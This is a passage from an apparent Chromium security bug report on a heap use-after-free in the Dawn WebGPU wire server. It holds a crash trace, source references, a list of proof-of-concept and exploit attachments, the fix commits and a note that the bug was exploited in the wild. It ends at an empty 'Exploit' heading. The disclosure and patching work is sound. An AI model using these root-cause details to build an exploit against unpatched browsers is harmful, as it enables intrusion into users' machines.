    #16 0x00035beea8a4 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1241e8a4)
    #17 0x00035bf5290c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1248690c)
    #18 0x00035bf51cc4 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x12485cc4)
    #19 0x00035c073330 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a7330)
    #20 0x00035c0649e0 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125989e0)
    #21 0x00035c071798 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xe4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a5798)
    #22 0x00019b3549f4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f9f4)
    #23 0x00019b354988 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f988)
    #24 0x00019b3546f4 in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f6f4)
    #25 0x00019b353384 in __CFRunLoopRun+0x330 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5e384)
    #26 0x00019b40de30 in _CFRunLoopRunSpecificWithOptions+0x210 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x118e30)
    #27 0x00019d5a2960 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:]+0xd0 (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:arm64e+0xa5b960)
    #28 0x00035c07448c in base::MessagePumpNSRunLoop::DoRun(base::MessagePump::Delegate*)+0xc8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a848c)
    #29 0x00035c070500 in base::MessagePumpCFRunLoopBase::Run(base::MessagePump::Delegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a4500)

previously allocated by thread T0 here:
    #0 0x00010542cf84 in __asan_memmove+0x2f9c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Helpers/Chromium Helper.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x54f84)
    #1 0x0003724bf314 in operator new(unsigned long)+0x18 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x289f3314)
    #2 0x0003621ac2b8 in dawn::wire::server::KnownObjectsBase<WGPUDeviceImpl*>::Allocate(dawn::wire::server::Reserved<WGPUDeviceImpl*>*, dawn::wire::ObjectHandle, dawn::wire::server::AllocationState)+0xac (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186e02b8)
    #3 0x0003621ab384 in dawn::wire::server::Server::DoAdapterRequestDevice(dawn::wire::server::Known<WGPUAdapterImpl*>, dawn::wire::ObjectHandle, WGPUFuture, dawn::wire::ObjectHandle, WGPUFuture, WGPUDeviceDescriptor const*)+0x150 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186df384)
    #4 0x0003621b1660 in dawn::wire::server::Server::HandleAdapterRequestDevice(dawn::wire::DeserializeBuffer*)+0x224 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186e5660)
    #5 0x0003621bab20 in dawn::wire::server::Server::HandleCommands(char const volatile*, unsigned long)+0x12c0 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186eeb20)
    #6 0x0003621ef38c in gpu::webgpu::(anonymous namespace)::DawnWireServer::HandleCommands(char const volatile*, unsigned long)+0x154 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1872338c)
    #7 0x0003621ef790 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::HandleDawnCommands(unsigned int, void const volatile*)+0x2e8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18723790)
    #8 0x0003621e5714 in gpu::webgpu::(anonymous namespace)::WebGPUDecoderImpl::DoCommands(unsigned int, void const volatile*, int, int*)+0x200 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18719714)
    #9 0x00035189af08 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)+0x4bc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7dcef08)
    #10 0x0003620fb380 in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)+0x450 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1862f380)
    #11 0x0003620fa4e8 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)+0x468 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1862e4e8)
    #12 0x000362118dcc in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)+0x290 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1864cdcc)
    #13 0x000362124a84 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)+0x144 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x18658a84)
    #14 0x00036212489c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)+0x118 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1865889c)
    #15 0x0003518d3d58 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7e07d58)
    #16 0x0003518ae838 in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)+0x634 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de2838)
    #17 0x0003518aced0 in gpu::Scheduler::RunNextTask()+0x27c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de0ed0)
    #18 0x0003518b026c in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x184 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7de426c)
    #19 0x00035beea8a4 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x348 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1241e8a4)
    #20 0x00035bf5290c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x88c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x1248690c)
    #21 0x00035bf51cc4 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x12485cc4)
    #22 0x00035c073330 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c8 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a7330)
    #23 0x00035c0649e0 in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125989e0)
    #24 0x00035c071798 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xe4 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x125a5798)
    #25 0x00019b3549f4 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f9f4)
    #26 0x00019b354988 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f988)
    #27 0x00019b3546f4 in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5f6f4)
    #28 0x00019b353384 in __CFRunLoopRun+0x330 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x5e384)
    #29 0x00019b40de30 in _CFRunLoopRunSpecificWithOptions+0x210 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x118e30)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x186e01cc) in dawn::wire::server::Server::DoAdapterRequestDevice(dawn::wire::server::Known<WGPUAdapterImpl*>, dawn::wire::ObjectHandle, WGPUFuture, dawn::wire::ObjectHandle, WGPUFuture, WGPUDeviceDescriptor const*)::$_0::__invoke(WGPUDeviceImpl* const*, WGPUErrorType, WGPUStringView, void*, void*)+0x278
Shadow bytes around the buggy address:
  0x60200007dc80: f7 fa fd fa f7 fa fd fa f7 fa fc fa f7 fa fd fa
  0x60200007dd00: f7 fa 00 00 f7 fa fd fd f7 fa fd fa f7 fa fd fa
  0x60200007dd80: f7 fa fd fd f7 fa 00 00 f7 fa 00 00 f7 fa 00 00
  0x60200007de00: f7 fa fd fd f7 fa 00 00 f7 fa 00 00 f7 fa 00 00
  0x60200007de80: f7 fa fd fd f7 fa 00 00 f7 fa fd fa f7 fa fd fa
=>0x60200007df00: f7 fa 00 00 f7 fa fd fd f7 fa 00 00 f7 fa[fd]fd
  0x60200007df80: f7 fa fd fa f7 fa fd fa f7 fa fd fd f7 fa fd fa
  0x60200007e000: f7 fa 00 00 f7 fa fd fd f7 fa fd fd f7 fa fd fd
  0x60200007e080: f7 fa fd fd f7 fa fd fd f7 fa fd fd f7 fa fd fd
  0x60200007e100: f7 fa fd fd f7 fa fd fd f7 fa fd fd f7 fa 00 00
  0x60200007e180: f7 fa 00 00 f7 fa 00 fa f7 fa 00 fa f7 fa fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==44414==ADDITIONAL INFO

==44414==Note: Please include this section with the ASan report.
Task trace:
    #0 0x0003518a8afc in gpu::Scheduler::TryScheduleSequence(gpu::Scheduler::Sequence*)+0x48c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/147.0.7725.0/Chromium Framework:arm64+0x7ddcafc)

MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==44414==END OF ADDITIONAL INFO

==44414==ABORTING
[44366:69197717:0309/192738.378215:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=256

```
## References

- ClearDeviceCallbacks (incomplete, only clears logging): <https://source.chromium.org/chromium/chromium/src/+/main:third_party/dawn/src/dawn/wire/server/Server.cpp;l=200-203>
- uncapturedErrorCallbackInfo setup with DeviceInfo\* userdata: <https://source.chromium.org/chromium/chromium/src/+/main:third_party/dawn/src/dawn/wire/server/ServerAdapter.cpp;l=63-73>
- DeviceInfo struct and ObjectData specialization: <https://source.chromium.org/chromium/chromium/src/+/main:third_party/dawn/src/dawn/wire/server/ObjectStorage.h;l=78-88>
- HandleError uncaptured-error callback invocation (mState == Alive guard): <https://source.chromium.org/chromium/chromium/src/+/main:third_party/dawn/src/dawn/native/Device.cpp;l=827-834>
- WillDropLastExternalRef resets mUncapturedErrorCallbackInfo: <https://source.chromium.org/chromium/chromium/src/+/main:third_party/dawn/src/dawn/native/Device.cpp;l=574-576>
- known\_device\_metadata\_ holds extra device reference: <https://source.chromium.org/chromium/chromium/src/+/main:gpu/command_buffer/service/webgpu_decoder_impl.cc;l=1619-1634>

## Credit

Please use 86ac1f1587b71893ed2ad792cd7dde32 as the credit for this vulnerability. Thank you.

## Attachments

- [patch.diff](attachments/patch.diff) (text/x-diff, 2.2 KB)
- [poc.html](attachments/poc.html) (text/html, 1.8 KB)
- [exp_occupy.diff](attachments/exp_occupy.diff) (text/x-diff, 2.6 KB)
- [exp_occupy.html](attachments/exp_occupy.html) (text/html, 1.8 KB)
- [exp_occupy_writeup.md](attachments/exp_occupy_writeup.md) (text/markdown, 4.9 KB)
- [exp_occupy.png](attachments/exp_occupy.png) (image/png, 2.2 MB)
- [exp.diff](attachments/exp.diff) (text/x-diff, 7.1 KB)
- [exp.html](attachments/exp.html) (text/html, 1.8 KB)
- [exp_writeup.md](attachments/exp_writeup.md) (text/markdown, 11.0 KB)
- [exp.png](attachments/exp.png) (image/png, 390.2 KB)
- [exp_gdb.png](attachments/exp_gdb.png) (image/png, 2.9 MB)
- [mac_exp_occupy.png](attachments/mac_exp_occupy.png) (image/png, 592.8 KB)
- [mac_exp_occupy.png](attachments/mac_exp_occupy_75786186.png) (image/png, 592.8 KB)

## Timeline

### dc...@chromium.org (2026-03-12)

Thanks for the report! Note that anything in //third\_party/blink/renderer is only going to execute in the renderer anyway so no need for a process type check there.

### ch...@google.com (2026-03-12)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-03-12)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### dx...@google.com (2026-03-16)

Project: dawn  

Branch:  main  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/297136>

[dawn][wire] Ensure that Devices on the Server always call Destroy.

---


Expand for full commit details
```
     
    - Because the wire server creates and manages callback information 
      for all Devices, we need to ensure that all Devices' callbacks 
      are fired before the server goes away. Otherwise, if the server 
      is deleted, and somehow there is an outstanding reference to the 
      backing native Device, the callbacks can happen and reference 
      freed memory. 
    - Updates Wire testing infrastructure to: 
      1) Use a NiceMock for the ProcTable to avoid overly strict tests 
         that end up adding a lot implementation detail expectations. 
      2) Add expecatations that successfully created Devices on the 
         server should call Destroy to ensure that their callbacks are 
         all flushed. 
      3) Remove some tech-debt/unused members and functions after the 
         change. 
     
    Bug: 491518608 
    Change-Id: I136f7c94ee7e2d79b5b04796bf850a990300aba4 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/297136 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerDoers.cpp`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `src/dawn/tests/unittests/wire/WireAdapterTests.cpp`
- M `src/dawn/tests/unittests/wire/WireBufferMappingTests.cpp`
- M `src/dawn/tests/unittests/wire/WireDisconnectTests.cpp`
- M `src/dawn/tests/unittests/wire/WireQueueTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/wire/server/Server.cpp`
- M `src/dawn/wire/server/Server.h`

---

Hash: 3c890398bda440703c55f25cdaf1f800a700970d  

Date: Mon Mar 16 19:47:12 2026


---

### dx...@google.com (2026-03-17)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7669409>

Roll Dawn from 24d032f9897c to 3c890398bda4 (4 revisions)

---


Expand for full commit details
```
     
    https://dawn.googlesource.com/dawn.git/+log/24d032f9897c..3c890398bda4 
     
    2026-03-16 lokokung@google.com [dawn][wire] Ensure that Devices on the Server always call Destroy. 
    2026-03-16 dsinclair@chromium.org [multiplanar] Add an external texture end2end test. 
    2026-03-16 dsinclair@chromium.org [multiplanar] Implement YCBCR sampler handling. 
    2026-03-16 rharrison@chromium.org [tint] Remove internal usage of Slice from Vector & VectorRef 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/dawn-chromium-autoroll 
    Please CC cwallez@google.com,senorblanco@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:dawn-android-arm-deps-rel;luci.chromium.try:dawn-android-arm64-deps-rel;luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-mac-arm64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel;luci.chromium.try:dawn-win11-arm64-deps-rel;luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-android-arm64 
    Bug: chromium:449980071,chromium:491363837,chromium:491518608 
    Tbr: senorblanco@google.com 
    Change-Id: Ib13318c1859b3ffe41c74f841cceadd7ad6bcbc2 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7669409 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1600243}

```

---

Files:

- M `DEPS`
- M `third_party/dawn`

---

Hash: [300be8746e37cb6e75eeeccd6f220795e880899c](https://chromiumdash.appspot.com/commit/300be8746e37cb6e75eeeccd6f220795e880899c)  

Date: Tue Mar 17 01:04:05 2026


---

### dr...@chromium.org (2026-03-20)

No crashes in Canary, approved to merge to M146 and M147.

### dx...@google.com (2026-03-24)

Project: dawn  

Branch:  chromium/7680  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/298595>

[M146] [dawn][wire] Ensure that Devices on the Server always call Destroy.

---


Expand for full commit details
```
     
    - Because the wire server creates and manages callback information 
      for all Devices, we need to ensure that all Devices' callbacks 
      are fired before the server goes away. Otherwise, if the server 
      is deleted, and somehow there is an outstanding reference to the 
      backing native Device, the callbacks can happen and reference 
      freed memory. 
    - Updates Wire testing infrastructure to: 
      1) Use a NiceMock for the ProcTable to avoid overly strict tests 
         that end up adding a lot implementation detail expectations. 
      2) Add expecatations that successfully created Devices on the 
         server should call Destroy to ensure that their callbacks are 
         all flushed. 
      3) Remove some tech-debt/unused members and functions after the 
         change. 
     
    Bug: 491518608 
    Change-Id: I136f7c94ee7e2d79b5b04796bf850a990300aba4 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/297136 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/298595 
    Auto-Submit: Loko Kung <lokokung@google.com> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerDoers.cpp`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `src/dawn/tests/unittests/wire/WireAdapterTests.cpp`
- M `src/dawn/tests/unittests/wire/WireBufferMappingTests.cpp`
- M `src/dawn/tests/unittests/wire/WireDisconnectTests.cpp`
- M `src/dawn/tests/unittests/wire/WireQueueTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/wire/server/Server.cpp`
- M `src/dawn/wire/server/Server.h`

---

Hash: adcf333bd486a7f0a1c5c4a52c8ea5ae54e15c32  

Date: Tue Mar 24 07:21:19 2026


---

### dx...@google.com (2026-03-24)

Project: dawn  

Branch:  chromium/7727  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/298615>

[M147] [dawn][wire] Ensure that Devices on the Server always call Destroy.

---


Expand for full commit details
```
     
    - Because the wire server creates and manages callback information 
      for all Devices, we need to ensure that all Devices' callbacks 
      are fired before the server goes away. Otherwise, if the server 
      is deleted, and somehow there is an outstanding reference to the 
      backing native Device, the callbacks can happen and reference 
      freed memory. 
    - Updates Wire testing infrastructure to: 
      1) Use a NiceMock for the ProcTable to avoid overly strict tests 
         that end up adding a lot implementation detail expectations. 
      2) Add expecatations that successfully created Devices on the 
         server should call Destroy to ensure that their callbacks are 
         all flushed. 
      3) Remove some tech-debt/unused members and functions after the 
         change. 
     
    Bug: 491518608 
    Change-Id: I136f7c94ee7e2d79b5b04796bf850a990300aba4 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/297136 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/298615 
    Auto-Submit: Loko Kung <lokokung@google.com> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org>

```

---

Files:

- M `generator/templates/dawn/wire/server/ServerDoers.cpp`
- M `generator/templates/mock_api.cpp`
- M `generator/templates/mock_api.h`
- M `src/dawn/tests/unittests/wire/WireAdapterTests.cpp`
- M `src/dawn/tests/unittests/wire/WireBufferMappingTests.cpp`
- M `src/dawn/tests/unittests/wire/WireDisconnectTests.cpp`
- M `src/dawn/tests/unittests/wire/WireQueueTests.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.cpp`
- M `src/dawn/tests/unittests/wire/WireTest.h`
- M `src/dawn/wire/server/Server.cpp`
- M `src/dawn/wire/server/Server.h`

---

Hash: bd2a43fb5c2d61d216521292acbaaa0a9d59dbb7  

Date: Tue Mar 24 07:23:00 2026


---

### pe...@google.com (2026-03-24)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### bs...@google.com (2026-03-27)

Google Threat Analysis Group has evidence that an exploit for this bug exists in the wild.

### ga...@microsoft.com (2026-03-27)

Given bsevens comment, Edge will treat this as an active ITW incident and ship an out of band patch.

### lo...@google.com (2026-03-27)

Regarding LTS merge:

1. Yes, it was a regression as a result of the change landed in Dawn in [comment#1](https://issues.chromium.org/issues/491518608#comment1).
2. I don't think the change is specifically related to change/feature landed after the milestone.

### vi...@google.com (2026-03-31)

For M138 LTS the [CL containing the fix](https://dawn-review.googlesource.com/297136) introduces conflicts that would require a large number of dependent CLs to resolve. Given that this dependency chain is unsafe to merge into LTS, I’m labeling it as not applicable for the M138 LTS.

### se...@gmail.com (2026-04-03)

**For Chrome VRP, this is the exploit that achieves heap UAF occupation for this vulnerability:**

## Exploit

